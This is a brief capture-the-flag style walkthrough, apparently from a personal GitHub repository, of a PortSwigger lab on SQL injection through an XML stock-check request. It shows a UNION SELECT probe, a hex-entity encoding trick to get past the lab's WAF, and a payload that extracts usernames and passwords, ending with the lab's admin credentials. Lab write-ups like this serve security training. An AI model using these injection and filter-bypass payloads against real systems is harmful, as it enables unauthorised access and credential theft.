# Hi hackers, Today we will play this [LAB](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-in-different-contexts/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

Let's go discover our website:

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/37be3471-dbdf-4bb3-ab25-6d8493f67c64)


No there vulnerablity here.

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/2bcfe6a4-99a3-4325-8860-256a1b76f8dc)

Ok Here we can exploit ```Check Stock``` button.

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/ae0b97bc-ff0a-4672-b398-8a5392781b17)


Ok We can add our payload inside ```<storeId>```

```
<storeId>
  1 UNION SELECT NULL
</storeId>
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/8d523d84-0598-474d-8751-c0c63e4fcb00)


Hmmm WAF detected this attack :)

Ok Let's encoding this payload to bypass this fuck WAF :(


[Screencast from 2024-07-05 12:19:54 AM.webm](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/1fde7971-7740-4130-a47a-adc54da8b1e0)



### WOoow we can exploit it . Let's go steal acccount of administrator , we will use this payload:


```
<storeId>
  <@hex_entities>
    1 UNION SELECT username||':'||password FROM users
  <@/hex_entities>
</storeId>
```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/ccd347f7-f1ec-40d1-a7cd-c6b57f688727)


Woow We got on Account of admin is ```administrator:y5swfqstminpfg0rwhk0```





















